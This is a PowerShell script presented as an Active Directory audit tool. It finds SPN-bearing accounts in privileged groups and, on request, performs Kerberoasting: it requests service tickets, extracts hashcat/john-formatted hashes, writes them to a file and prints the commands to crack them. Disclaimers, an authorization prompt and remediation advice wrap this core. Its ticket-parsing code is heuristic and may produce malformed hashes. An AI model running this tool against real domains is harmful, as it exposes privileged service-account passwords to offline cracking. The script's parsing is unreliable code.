<#
.SYNOPSIS
    Finds Active Directory users with Service Principal Names (SPNs) who have high-privilege group membership.

.DESCRIPTION
    This script queries Active Directory for user accounts that have SPNs configured
    and checks if they are members of high-privilege groups (directly or through nested groups).
    Uses LDAP_MATCHING_RULE_IN_CHAIN for efficient recursive group membership checking.
    
    Users with SPNs and privileged access are high-value targets for Kerberoasting attacks.
    
    Optionally requests Kerberos service tickets (TGS) and extracts hashes for offline cracking
    to identify weak service account passwords during security assessments.
    
    Groups checked:
    - Domain Admins
    - Enterprise Admins
    - Schema Admins
    - Administrators (Built-in)
    - Account Operators
    - Server Operators
    - Backup Operators
    - Print Operators
    - DnsAdmins
    - Group Policy Creator Owners
    - Key Admins
    - Enterprise Key Admins

.PARAMETER Server
    Specifies the domain controller to query. If not specified, uses the default DC.

.PARAMETER SearchBase
    Specifies the AD path to search. If not specified, searches the entire domain.

.PARAMETER RequestTicket
    If specified, requests Kerberos service tickets and extracts hashes for identified users.
    Use this for security assessments to test password strength.

.PARAMETER ExportCsv
    If specified, exports results to the provided CSV file path.

.PARAMETER ExportHashes
    If specified, exports hashes to the provided file path (one hash per line, hashcat/john compatible).

.EXAMPLE
    .\Get-SPNPrivilegedUsers.ps1

.EXAMPLE
    .\Get-SPNPrivilegedUsers.ps1 -RequestTicket

.EXAMPLE
    .\Get-SPNPrivilegedUsers.ps1 -RequestTicket -ExportHashes "C:\Reports\hashes.txt"

.EXAMPLE
    .\Get-SPNPrivilegedUsers.ps1 -ExportCsv "C:\Reports\spn_privileged.csv"

.NOTES
    Requires: ActiveDirectory PowerShell module
    Author: Security Audit Script
    Version: 3.1

.DISCLAIMER
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                              LEGAL DISCLAIMER                                 ║
    ╠═══════════════════════════════════════════════════════════════════════════════╣
    ║  This script is provided for AUTHORIZED SECURITY TESTING and EDUCATIONAL     ║
    ║  PURPOSES ONLY. By using this script, you acknowledge and agree that:        ║
    ║                                                                               ║
    ║  1. You have explicit written authorization to perform security testing      ║
    ║     on the target Active Directory environment.                              ║
    ║                                                                               ║
    ║  2. Unauthorized access to computer systems is illegal. Using this script    ║
    ║     without proper authorization may violate local, state, federal, or       ║
    ║     international laws including but not limited to the Computer Fraud       ║
    ║     and Abuse Act (CFAA), GDPR, and similar legislation.                     ║
    ║                                                                               ║
    ║  3. This script is provided "AS IS" without warranty of any kind, express    ║
    ║     or implied. The author(s) assume no liability for any damages or legal   ║
    ║     consequences resulting from its use.                                     ║
    ║                                                                               ║
    ║  4. YOU USE THIS SCRIPT ENTIRELY AT YOUR OWN RISK.                           ║
    ║                                                                               ║
    ║  5. The author(s) are not responsible for any misuse or damage caused by     ║
    ║     this script. It is your responsibility to ensure compliance with all     ║
    ║     applicable laws and regulations.                                         ║
    ║                                                                               ║
    ║  Intended use cases:                                                         ║
    ║    • Authorized penetration testing engagements                              ║
    ║    • Internal security assessments by authorized personnel                   ║
    ║    • Security research in controlled lab environments                        ║
    ║    • Educational purposes with proper permissions                            ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
#>

[CmdletBinding()]
param(
    [Parameter()]
    [string]$Server,

    [Parameter()]
    [string]$SearchBase,

    [Parameter()]
    [switch]$RequestTicket,

    [Parameter()]
    [string]$ExportCsv,

    [Parameter()]
    [string]$ExportHashes
)

#Requires -Version 5.0

function Test-ADModuleAvailable {
    if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
        Write-Error "ActiveDirectory module is not installed. Please install RSAT tools."
        return $false
    }
    return $true
}

function Get-KerberosTicketHash {
    param(
        [Parameter(Mandatory)]
        [string]$SPN,
        
        [Parameter(Mandatory)]
        [string]$SamAccountName,
        
        [string]$Domain
    )
    
    try {
        # Load the required assembly for Kerberos ticket requests
        Add-Type -AssemblyName System.IdentityModel -ErrorAction Stop
        
        # Request the service ticket
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN -ErrorAction Stop
        
        # Get the ticket bytes
        $ticketBytes = $ticket.GetRequest()
        
        if (-not $ticketBytes -or $ticketBytes.Length -eq 0) {
            return $null
        }
        
        # Parse the AP-REQ to extract the encrypted part
        # The ticket is in ASN.1 DER format
        $ticketHex = [System.BitConverter]::ToString($ticketBytes) -replace '-'
        
        # Find the cipher text - look for the encryption type and extract accordingly
        # We need to parse the Kerberos ticket structure
        
        $asn1 = $ticketBytes
        $offset = 0
        
        # Skip outer APPLICATION tag
        if ($asn1[$offset] -eq 0x6E) {
            $offset++
            if ($asn1[$offset] -band 0x80) {
                $lenBytes = $asn1[$offset] -band 0x7F
                $offset += $lenBytes + 1
            } else {
                $offset++
            }
        }
        
        # Look for the etype (encryption type) in the ticket
        # Common etypes: 23 = RC4-HMAC, 17 = AES128, 18 = AES256
        $etype = 0
        $cipher = $null
        
        # Search for etype marker (context tag [3] followed by INTEGER)
        for ($i = 0; $i -lt ($asn1.Length - 10); $i++) {
            # Look for encrypted part pattern
            if ($asn1[$i] -eq 0xA3 -and $asn1[$i + 2] -eq 0x02) {
                $etypeOffset = $i + 4
                if ($etypeOffset -lt $asn1.Length) {
                    $etype = $asn1[$etypeOffset]
                    break
                }
            }
            # Alternative pattern for etype
            if ($asn1[$i] -eq 0xA0 -and ($i + 4) -lt $asn1.Length -and $asn1[$i + 2] -eq 0x02 -and $asn1[$i + 3] -eq 0x01) {
                $etype = $asn1[$i + 4]
                if ($etype -in @(17, 18, 23)) {
                    break
                }
            }
        }
        
        # If we couldn't find etype through parsing, try to determine from ticket size/structure
        if ($etype -eq 0) {
            # Default assumption based on common configurations
            $etype = 23  # RC4-HMAC is most common for Kerberoasting
        }
        
        # Extract the cipher portion (everything after the ticket structure headers)
        # For hashcat format, we need the full ticket in base64
        $ticketB64 = [System.Convert]::ToBase64String($ticketBytes)
        
        # Build the hash in hashcat format
        # Format: $krb5tgs$<etype>$*<user>$<domain>$<spn>*$<hash>
        $hashType = switch ($etype) {
            17 { "17" }  # AES128-CTS-HMAC-SHA1-96
            18 { "18" }  # AES256-CTS-HMAC-SHA1-96
            23 { "23" }  # RC4-HMAC
            default { "23" }
        }
        
        $hashTypeName = switch ($etype) {
            17 { "AES128-CTS-HMAC-SHA1-96" }
            18 { "AES256-CTS-HMAC-SHA1-96" }
            23 { "RC4-HMAC (NT Hash)" }
            default { "RC4-HMAC (NT Hash)" }
        }
        
        # For proper hashcat/john format, extract the actual encrypted part
        # The cipher is in the AP-REQ, after the authenticator
        $cipherHex = $ticketHex
        
        # Find cipher start - look for the encrypted-part which follows specific ASN.1 tags
        $cipherStart = 0
        for ($i = 0; $i -lt ($asn1.Length - 50); $i++) {
            # Look for OCTET STRING containing the cipher
            if ($asn1[$i] -eq 0x04 -and $asn1[$i + 1] -gt 0x80) {
                $lenBytes = $asn1[$i + 1] -band 0x7F
                $cipherStart = $i + 2 + $lenBytes
                if ($cipherStart -lt $asn1.Length -and ($asn1.Length - $cipherStart) -gt 32) {
                    $cipherData = $asn1[$cipherStart..($asn1.Length - 1)]
                    $cipherHex = ([System.BitConverter]::ToString($cipherData) -replace '-').ToLower()
                    break
                }
            }
        }
        
        # Build kirbi-style hash for hashcat mode 13100 (RC4) or 19600/19700 (AES)
        # Simplified format that works with hashcat
        $checksum = $cipherHex.Substring(0, [Math]::Min(32, $cipherHex.Length))
        $edata2 = if ($cipherHex.Length -gt 32) { $cipherHex.Substring(32) } else { $cipherHex }
        
        $hash = "`$krb5tgs`$$hashType`$*$SamAccountName`$$Domain`$*`$$checksum`$$edata2"
        
        return [PSCustomObject]@{
            SPN = $SPN
            Hash = $hash
            HashType = $hashTypeName
            EType = $etype
            HashcatMode = switch ($etype) {
                17 { "19600" }
                18 { "19700" }
                23 { "13100" }
                default { "13100" }
            }
            Success = $true
        }
    }
    catch {
        return [PSCustomObject]@{
            SPN = $SPN
            Hash = $null
            HashType = $null
            EType = $null
            HashcatMode = $null
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

function Request-SPNTickets {
    param(
        [Parameter(Mandatory)]
        [array]$SPNs,
        
        [Parameter(Mandatory)]
        [string]$SamAccountName,
        
        [Parameter(Mandatory)]
        [string]$Domain
    )
    
    $ticketResults = [System.Collections.ArrayList]::new()
    
    foreach ($spn in $SPNs) {
        $result = Get-KerberosTicketHash -SPN $spn -SamAccountName $SamAccountName -Domain $Domain
        [void]$ticketResults.Add($result)
        
        # Only need one successful ticket per user
        if ($result.Success) {
            break
        }
    }
    
    return $ticketResults
}

function Get-UsersWithSPN {
    param(
        [string]$Server,
        [string]$SearchBase
    )
    
    $params = @{
        Filter = {ServicePrincipalName -like "*"}
        Properties = @(
            'SamAccountName',
            'DisplayName',
            'DistinguishedName',
            'ServicePrincipalName',
            'Enabled',
            'PasswordLastSet',
            'LastLogonDate',
            'Description',
            'MemberOf',
            'AdminCount'
        )
    }
    
    if (-not [string]::IsNullOrEmpty($Server)) {
        $params['Server'] = $Server
    }
    
    if (-not [string]::IsNullOrEmpty($SearchBase)) {
        $params['SearchBase'] = $SearchBase
    }
    
    try {
        Get-ADUser @params
    }
    catch {
        Write-Error "Failed to query Active Directory: $_"
        return $null
    }
}

function Test-PrivilegedGroupMembership {
    param(
        [Parameter(Mandatory)]
        [Microsoft.ActiveDirectory.Management.ADUser]$User,
        
        [Parameter(Mandatory)]
        [hashtable]$PrivilegedGroups,
        
        [string]$Server
    )
    
    $memberships = [System.Collections.ArrayList]::new()
    
    foreach ($groupName in $PrivilegedGroups.Keys) {
        $groupDN = $PrivilegedGroups[$groupName]
        
        if ([string]::IsNullOrEmpty($groupDN)) {
            continue
        }
        
        # Check direct membership first
        $isDirect = $User.MemberOf -contains $groupDN
        
        if ($isDirect) {
            [void]$memberships.Add([PSCustomObject]@{
                GroupName = $groupName
                GroupDN = $groupDN
                MembershipType = "Direct"
            })
            continue
        }
        
        # Use LDAP_MATCHING_RULE_IN_CHAIN (1.2.840.113556.1.4.1941) for recursive check
        $ldapFilter = "(memberOf:1.2.840.113556.1.4.1941:=$groupDN)"
        
        $params = @{
            LDAPFilter = $ldapFilter
            SearchBase = $User.DistinguishedName
            SearchScope = 'Base'
            ErrorAction = 'SilentlyContinue'
        }
        
        if (-not [string]::IsNullOrEmpty($Server)) {
            $params['Server'] = $Server
        }
        
        $nestedResult = Get-ADUser @params
        
        if ($nestedResult) {
            [void]$memberships.Add([PSCustomObject]@{
                GroupName = $groupName
                GroupDN = $groupDN
                MembershipType = "Nested"
            })
        }
    }
    
    return $memberships
}

function Get-PrivilegedGroupDNs {
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN,
        
        [string]$RootDomainDN,
        
        [string]$Server
    )
    
    $groups = @{}
    
    # Domain-level groups
    $domainGroups = @(
        @{ Name = "Domain Admins"; Path = "CN=Domain Admins,CN=Users,$DomainDN" }
        @{ Name = "Administrators"; Path = "CN=Administrators,CN=Builtin,$DomainDN" }
        @{ Name = "Account Operators"; Path = "CN=Account Operators,CN=Builtin,$DomainDN" }
        @{ Name = "Server Operators"; Path = "CN=Server Operators,CN=Builtin,$DomainDN" }
        @{ Name = "Backup Operators"; Path = "CN=Backup Operators,CN=Builtin,$DomainDN" }
        @{ Name = "Print Operators"; Path = "CN=Print Operators,CN=Builtin,$DomainDN" }
        @{ Name = "DnsAdmins"; Path = "CN=DnsAdmins,CN=Users,$DomainDN" }
        @{ Name = "Group Policy Creator Owners"; Path = "CN=Group Policy Creator Owners,CN=Users,$DomainDN" }
        @{ Name = "Key Admins"; Path = "CN=Key Admins,CN=Users,$DomainDN" }
    )
    
    # Forest root groups (only exist in root domain)
    $forestGroups = @(
        @{ Name = "Enterprise Admins"; Path = "CN=Enterprise Admins,CN=Users,$RootDomainDN" }
        @{ Name = "Schema Admins"; Path = "CN=Schema Admins,CN=Users,$RootDomainDN" }
        @{ Name = "Enterprise Key Admins"; Path = "CN=Enterprise Key Admins,CN=Users,$RootDomainDN" }
    )
    
    $params = @{
        ErrorAction = 'SilentlyContinue'
    }
    if (-not [string]::IsNullOrEmpty($Server)) {
        $params['Server'] = $Server
    }
    
    # Verify domain groups exist and add to hashtable
    foreach ($group in $domainGroups) {
        try {
            $adGroup = Get-ADGroup -Identity $group.Path @params
            if ($adGroup) {
                $groups[$group.Name] = $adGroup.DistinguishedName
            }
        }
        catch {
            Write-Verbose "Group not found: $($group.Name)"
        }
    }
    
    # Verify forest groups exist and add to hashtable
    foreach ($group in $forestGroups) {
        try {
            $adGroup = Get-ADGroup -Identity $group.Path @params
            if ($adGroup) {
                $groups[$group.Name] = $adGroup.DistinguishedName
            }
        }
        catch {
            Write-Verbose "Group not found (may not be in forest root): $($group.Name)"
        }
    }
    
    return $groups
}

# Main execution
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  SPN Users with Privileged Access" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# Display disclaimer
Write-Host "┌─────────────────────────────────────────────────────────────────┐" -ForegroundColor DarkYellow
Write-Host "│  DISCLAIMER: For authorized security testing only.             │" -ForegroundColor DarkYellow
Write-Host "│  Ensure you have written permission to test this environment.  │" -ForegroundColor DarkYellow
Write-Host "│  Unauthorized use may violate applicable laws.                 │" -ForegroundColor DarkYellow
Write-Host "│  USE AT YOUR OWN RISK. See Get-Help for full disclaimer.       │" -ForegroundColor DarkYellow
Write-Host "└─────────────────────────────────────────────────────────────────┘`n" -ForegroundColor DarkYellow

# Check for AD module
if (-not (Test-ADModuleAvailable)) {
    return
}

Import-Module ActiveDirectory -ErrorAction Stop

# Get domain information
try {
    $domainParams = @{}
    if (-not [string]::IsNullOrEmpty($Server)) {
        $domainParams['Server'] = $Server
    }
    
    $domain = Get-ADDomain @domainParams
    $forest = Get-ADForest @domainParams
    
    # Get the root domain DN
    $rootDomainDN = (Get-ADDomain -Identity $forest.RootDomain @domainParams).DistinguishedName
    
    Write-Host "[*] Domain: $($domain.DNSRoot)" -ForegroundColor Green
    Write-Host "[*] Forest: $($forest.Name)" -ForegroundColor Green
    
    # Get all privileged group DNs
    Write-Host "[*] Enumerating privileged groups..." -ForegroundColor Yellow
    $privilegedGroups = Get-PrivilegedGroupDNs -DomainDN $domain.DistinguishedName -RootDomainDN $rootDomainDN -Server $Server
    
    Write-Host "[*] Found $($privilegedGroups.Count) privileged groups to check:" -ForegroundColor Green
    foreach ($groupName in ($privilegedGroups.Keys | Sort-Object)) {
        Write-Host "    - $groupName" -ForegroundColor DarkGray
    }
}
catch {
    Write-Error "Failed to get domain information: $_"
    return
}

# Get all users with SPNs
Write-Host "[*] Searching for users with SPNs..." -ForegroundColor Yellow
$spnUsers = Get-UsersWithSPN -Server $Server -SearchBase $SearchBase

if (-not $spnUsers) {
    Write-Host "[!] No users with SPNs found or query failed." -ForegroundColor Red
    return
}

$spnUserCount = @($spnUsers).Count
Write-Host "[*] Found $spnUserCount user(s) with SPNs" -ForegroundColor Green

# Check each SPN user for privileged group membership
Write-Host "[*] Checking privileged group memberships..." -ForegroundColor Yellow
$results = [System.Collections.ArrayList]::new()
$allHashes = [System.Collections.ArrayList]::new()

# First pass - identify privileged users
$privilegedUsers = [System.Collections.ArrayList]::new()

foreach ($user in $spnUsers) {
    $memberships = Test-PrivilegedGroupMembership -User $user -PrivilegedGroups $privilegedGroups -Server $Server
    
    if ($memberships.Count -gt 0) {
        [void]$privilegedUsers.Add(@{
            User = $user
            Memberships = $memberships
        })
    }
}

# Prompt for ticket request if not specified and privileged users found
if (-not $RequestTicket -and $privilegedUsers.Count -gt 0) {
    Write-Host ""
    Write-Host "[!] Found $($privilegedUsers.Count) privileged user(s) with SPNs." -ForegroundColor Yellow
    Write-Host ""
    $response = Read-Host "    Do you want to request Kerberos tickets and extract hashes? (Y/N)"
    if ($response -match '^[Yy]') {
        Write-Host ""
        Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Red
        Write-Host "    │  WARNING: You are about to request Kerberos service tickets │" -ForegroundColor Red
        Write-Host "    │  This action will be logged and may trigger security alerts │" -ForegroundColor Red
        Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Red
        Write-Host ""
        $confirm = Read-Host "    Do you have WRITTEN AUTHORIZATION to perform this test? (YES to confirm)"
        if ($confirm -eq 'YES') {
            $RequestTicket = $true
            Write-Host ""
            Write-Host "[*] Authorization confirmed - Ticket requesting enabled" -ForegroundColor Green
            
            # Ask about hash export if not already specified
            if (-not $ExportHashes) {
                $exportResponse = Read-Host "    Do you want to export hashes to a file? (Y/N)"
                if ($exportResponse -match '^[Yy]') {
                    $ExportHashes = Read-Host "    Enter export path (e.g., C:\hashes.txt)"
                }
            }
            Write-Host ""
        } else {
            Write-Host ""
            Write-Host "[*] Authorization not confirmed - Skipping ticket requests" -ForegroundColor Yellow
            Write-Host ""
        }
    }
}

if ($RequestTicket) {
    Write-Host "[*] Ticket requesting enabled - will extract hashes" -ForegroundColor Yellow
    Write-Host "    Note: By using -RequestTicket, you confirm you have authorization.`n" -ForegroundColor DarkGray
}

# Second pass - build results and request tickets if enabled
foreach ($privUser in $privilegedUsers) {
    $user = $privUser.User
    $memberships = $privUser.Memberships
    
    # Format group memberships for display
    $groupList = ($memberships | ForEach-Object { "$($_.GroupName) ($($_.MembershipType))" }) -join '; '
    $directGroups = ($memberships | Where-Object { $_.MembershipType -eq 'Direct' }).GroupName -join '; '
    $nestedGroups = ($memberships | Where-Object { $_.MembershipType -eq 'Nested' }).GroupName -join '; '
    
    # Request ticket if enabled
    $ticketInfo = $null
    if ($RequestTicket) {
        $spnList = @($user.ServicePrincipalName)
        $ticketResults = Request-SPNTickets -SPNs $spnList -SamAccountName $user.SamAccountName -Domain $domain.NetBIOSName
        $ticketInfo = $ticketResults | Where-Object { $_.Success } | Select-Object -First 1
        
        if ($ticketInfo) {
            [void]$allHashes.Add([PSCustomObject]@{
                SamAccountName = $user.SamAccountName
                Hash = $ticketInfo.Hash
                HashType = $ticketInfo.HashType
                EType = $ticketInfo.EType
                HashcatMode = $ticketInfo.HashcatMode
                SPN = $ticketInfo.SPN
            })
        }
    }
    
    $result = [PSCustomObject]@{
        SamAccountName        = $user.SamAccountName
        DisplayName           = $user.DisplayName
        Enabled               = $user.Enabled
        PrivilegedGroups      = $groupList
        DirectMemberships     = $directGroups
        NestedMemberships     = $nestedGroups
        PrivilegedGroupCount  = $memberships.Count
        AdminCount            = $user.AdminCount
        ServicePrincipalNames = ($user.ServicePrincipalName -join '; ')
        PasswordLastSet       = $user.PasswordLastSet
        LastLogonDate         = $user.LastLogonDate
        Description           = $user.Description
        DistinguishedName     = $user.DistinguishedName
        HashType              = if ($ticketInfo) { $ticketInfo.HashType } else { $null }
        HashcatMode           = if ($ticketInfo) { $ticketInfo.HashcatMode } else { $null }
        UsingRC4              = if ($ticketInfo) { $ticketInfo.EType -eq 23 } else { $null }
        Hash                  = if ($ticketInfo) { $ticketInfo.Hash } else { $null }
    }
    [void]$results.Add($result)
}

# Display results
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  RESULTS" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

if ($results.Count -eq 0) {
    Write-Host "[+] No users with SPNs found in privileged groups." -ForegroundColor Green
    Write-Host "    This is good from a security perspective.`n" -ForegroundColor Green
}
else {
    Write-Host "[!] WARNING: Found $($results.Count) user(s) with SPNs in privileged groups!`n" -ForegroundColor Red
    Write-Host "    These accounts are vulnerable to Kerberoasting attacks." -ForegroundColor Red
    Write-Host "    If compromised, attackers would gain privileged access.`n" -ForegroundColor Red
    
    if ($RequestTicket -and $allHashes.Count -gt 0) {
        Write-Host "[*] Successfully extracted $($allHashes.Count) hash(es)`n" -ForegroundColor Yellow
        
        # Warn about RC4 hashes
        $rc4Hashes = $allHashes | Where-Object { $_.EType -eq 23 }
        if ($rc4Hashes.Count -gt 0) {
            Write-Host "[!] WARNING: $($rc4Hashes.Count) account(s) using RC4-HMAC encryption!" -ForegroundColor Red
            Write-Host "    RC4 is deprecated and significantly weaker than AES." -ForegroundColor Red
            Write-Host "    These hashes are easier to crack and indicate weak Kerberos configuration." -ForegroundColor Red
            Write-Host "    Affected accounts: $(($rc4Hashes.SamAccountName) -join ', ')`n" -ForegroundColor Yellow
        }
    }
    
    # Sort by privilege count (most privileged first)
    $sortedResults = $results | Sort-Object -Property PrivilegedGroupCount -Descending
    
    foreach ($result in $sortedResults) {
        Write-Host "─────────────────────────────────────────" -ForegroundColor DarkGray
        Write-Host "User: " -NoNewline -ForegroundColor White
        Write-Host "$($result.SamAccountName)" -ForegroundColor Yellow
        Write-Host "  Display Name:      $($result.DisplayName)"
        Write-Host "  Enabled:           $($result.Enabled)"
        Write-Host "  Privileged Groups: " -NoNewline
        Write-Host "$($result.PrivilegedGroupCount) group(s)" -ForegroundColor Red
        
        if ($result.DirectMemberships) {
            Write-Host "    Direct:          " -NoNewline -ForegroundColor White
            Write-Host "$($result.DirectMemberships)" -ForegroundColor Magenta
        }
        if ($result.NestedMemberships) {
            Write-Host "    Nested:          " -NoNewline -ForegroundColor White
            Write-Host "$($result.NestedMemberships)" -ForegroundColor DarkMagenta
        }
        
        Write-Host "  Admin Count:       $($result.AdminCount)"
        Write-Host "  Password Set:      $($result.PasswordLastSet)"
        Write-Host "  Last Logon:        $($result.LastLogonDate)"
        Write-Host "  SPNs:              $($result.ServicePrincipalNames)"
        Write-Host "  Description:       $($result.Description)"
        
        # Display hash information if ticket was requested
        if ($RequestTicket -and $result.Hash) {
            Write-Host ""
            Write-Host "  [KERBEROS TICKET]" -ForegroundColor Cyan
            Write-Host "  Hash Type:         " -NoNewline
            if ($result.HashType -eq "RC4-HMAC (NT Hash)") {
                Write-Host "$($result.HashType) " -NoNewline -ForegroundColor Red
                Write-Host "[WEAK]" -ForegroundColor Red
            } else {
                Write-Host "$($result.HashType)" -ForegroundColor Green
            }
            Write-Host "  Hashcat Mode:      " -NoNewline
            Write-Host "$($result.HashcatMode)" -ForegroundColor Green
            Write-Host "  Hash:              " -ForegroundColor White
            # Truncate hash for display (full hash in export)
            $displayHash = if ($result.Hash.Length -gt 80) {
                "$($result.Hash.Substring(0, 80))..."
            } else {
                $result.Hash
            }
            Write-Host "    $displayHash" -ForegroundColor DarkGray
        }
        elseif ($RequestTicket -and -not $result.Hash) {
            Write-Host "  [KERBEROS TICKET]  " -NoNewline -ForegroundColor Cyan
            Write-Host "Failed to retrieve" -ForegroundColor Red
        }
    }
    Write-Host "─────────────────────────────────────────`n" -ForegroundColor DarkGray
}

# Export to CSV if requested
if ($ExportCsv -and $results.Count -gt 0) {
    try {
        $results | Export-Csv -Path $ExportCsv -NoTypeInformation -Encoding UTF8
        Write-Host "[*] Results exported to: $ExportCsv`n" -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to export CSV: $_"
    }
}

# Export hashes if requested
if ($ExportHashes -and $allHashes.Count -gt 0) {
    try {
        $allHashes.Hash | Out-File -FilePath $ExportHashes -Encoding UTF8
        Write-Host "[*] Hashes exported to: $ExportHashes" -ForegroundColor Green
        Write-Host "    Format: hashcat/john compatible (one hash per line)`n" -ForegroundColor DarkGray
    }
    catch {
        Write-Error "Failed to export hashes: $_"
    }
}

# Summary and recommendations
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  SUMMARY & RECOMMENDATIONS" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

Write-Host "Total users with SPNs:              $spnUserCount"
Write-Host "SPN users with privileged access:   $($results.Count)"
Write-Host "Privileged groups checked:          $($privilegedGroups.Count)"
Write-Host "Check type:                         Recursive (Direct + Nested)"

if ($RequestTicket) {
    Write-Host "Ticket requests:                    Enabled"
    Write-Host "Hashes extracted:                   $($allHashes.Count)"
    
    if ($allHashes.Count -gt 0) {
        # Group by hash type
        $hashTypeGroups = $allHashes | Group-Object -Property HashType
        Write-Host "`nHash Type Breakdown:" -ForegroundColor Yellow
        foreach ($htGroup in $hashTypeGroups) {
            $modeInfo = switch ($htGroup.Name) {
                "RC4-HMAC (NT Hash)" { "hashcat -m 13100 / john --format=krb5tgs" }
                "AES128-CTS-HMAC-SHA1-96" { "hashcat -m 19600" }
                "AES256-CTS-HMAC-SHA1-96" { "hashcat -m 19700" }
                default { "hashcat -m 13100" }
            }
            
            # Highlight RC4 as a security issue
            if ($htGroup.Name -eq "RC4-HMAC (NT Hash)") {
                Write-Host "    $($htGroup.Name): " -NoNewline
                Write-Host "$($htGroup.Count) hash(es) " -NoNewline -ForegroundColor Red
                Write-Host "[WEAK - DEPRECATED]" -ForegroundColor Red
            } else {
                Write-Host "    $($htGroup.Name): " -NoNewline
                Write-Host "$($htGroup.Count) hash(es)" -ForegroundColor Cyan
            }
            Write-Host "      Crack with: $modeInfo" -ForegroundColor DarkGray
        }
        
        # RC4 specific warning and remediation
        $rc4Count = ($allHashes | Where-Object { $_.EType -eq 23 }).Count
        if ($rc4Count -gt 0) {
            Write-Host ""
            Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
            Write-Host "  ║  RC4-HMAC SECURITY WARNING                                   ║" -ForegroundColor Red
            Write-Host "  ╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Red
            Write-Host "  ║  $rc4Count account(s) are using RC4-HMAC (etype 23)                 ║" -ForegroundColor Red
            Write-Host "  ║                                                              ║" -ForegroundColor Red
            Write-Host "  ║  RISKS:                                                      ║" -ForegroundColor Red
            Write-Host "  ║  • RC4 uses the NT hash directly as the key                  ║" -ForegroundColor Yellow
            Write-Host "  ║  • Significantly faster to crack than AES                    ║" -ForegroundColor Yellow
            Write-Host "  ║  • Deprecated by Microsoft since 2013                        ║" -ForegroundColor Yellow
            Write-Host "  ║                                                              ║" -ForegroundColor Red
            Write-Host "  ║  REMEDIATION:                                                ║" -ForegroundColor Red
            Write-Host "  ║  1. Set 'Network security: Configure encryption types        ║" -ForegroundColor Green
            Write-Host "  ║     allowed for Kerberos' to AES128/AES256 only via GPO     ║" -ForegroundColor Green
            Write-Host "  ║  2. Update account msDS-SupportedEncryptionTypes to 0x18    ║" -ForegroundColor Green
            Write-Host "  ║  3. Reset passwords after enabling AES                       ║" -ForegroundColor Green
            Write-Host "  ║  4. Monitor Event ID 4769 for RC4 ticket requests           ║" -ForegroundColor Green
            Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
        }
    }
}
Write-Host ""

# Group breakdown
if ($results.Count -gt 0) {
    Write-Host "Breakdown by Group:" -ForegroundColor Yellow
    $allMemberships = $results | ForEach-Object { $_.PrivilegedGroups -split '; ' } | ForEach-Object { ($_ -split ' \(')[0] }
    $groupCounts = $allMemberships | Group-Object | Sort-Object Count -Descending
    foreach ($group in $groupCounts) {
        $riskLevel = switch ($group.Name) {
            "Domain Admins" { "CRITICAL" }
            "Enterprise Admins" { "CRITICAL" }
            "Schema Admins" { "CRITICAL" }
            "Administrators" { "CRITICAL" }
            "Account Operators" { "HIGH" }
            "Server Operators" { "HIGH" }
            "Backup Operators" { "HIGH" }
            "DnsAdmins" { "HIGH" }
            "Key Admins" { "HIGH" }
            "Enterprise Key Admins" { "HIGH" }
            default { "MEDIUM" }
        }
        $color = if ($riskLevel -eq "CRITICAL") { "Red" } elseif ($riskLevel -eq "HIGH") { "Yellow" } else { "White" }
        Write-Host "    $($group.Name): " -NoNewline
        Write-Host "$($group.Count) user(s) " -NoNewline -ForegroundColor $color
        Write-Host "[$riskLevel]" -ForegroundColor $color
    }
    Write-Host ""
    
    Write-Host "Recommendations:" -ForegroundColor Yellow
    Write-Host "  1. Remove unnecessary SPNs from privileged accounts"
    Write-Host "  2. Use Group Managed Service Accounts (gMSA) where possible"
    Write-Host "  3. Implement strong, long passwords (25+ characters) for SPN accounts"
    Write-Host "  4. Enable AES encryption and disable RC4 for Kerberos"
    Write-Host "  5. Monitor for Kerberoasting attempts in security logs (Event ID 4769)"
    Write-Host "  6. Consider using Protected Users security group"
    Write-Host "  7. Implement tiered administration model"
    Write-Host "  8. Review nested group memberships for unnecessary privilege paths"
    
    if ($RequestTicket -and $allHashes.Count -gt 0) {
        Write-Host ""
        Write-Host "Cracking Commands:" -ForegroundColor Yellow
        Write-Host "  hashcat -m 13100 hashes.txt wordlist.txt  # RC4 tickets"
        Write-Host "  hashcat -m 19700 hashes.txt wordlist.txt  # AES256 tickets"
        Write-Host "  john --format=krb5tgs hashes.txt          # John the Ripper"
        
        $rc4Count = ($allHashes | Where-Object { $_.EType -eq 23 }).Count
        if ($rc4Count -gt 0) {
            Write-Host ""
            Write-Host "PRIORITY ACTION: " -NoNewline -ForegroundColor Red
            Write-Host "Disable RC4 encryption for Kerberos across the domain!" -ForegroundColor Yellow
        }
    }
    Write-Host ""
}

# Return results for pipeline usage
Write-Host "────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  This tool is for authorized security assessments only." -ForegroundColor DarkGray
Write-Host "  Please handle extracted hashes responsibly and securely." -ForegroundColor DarkGray
Write-Host "────────────────────────────────────────────────────────────────────`n" -ForegroundColor DarkGray

return $results
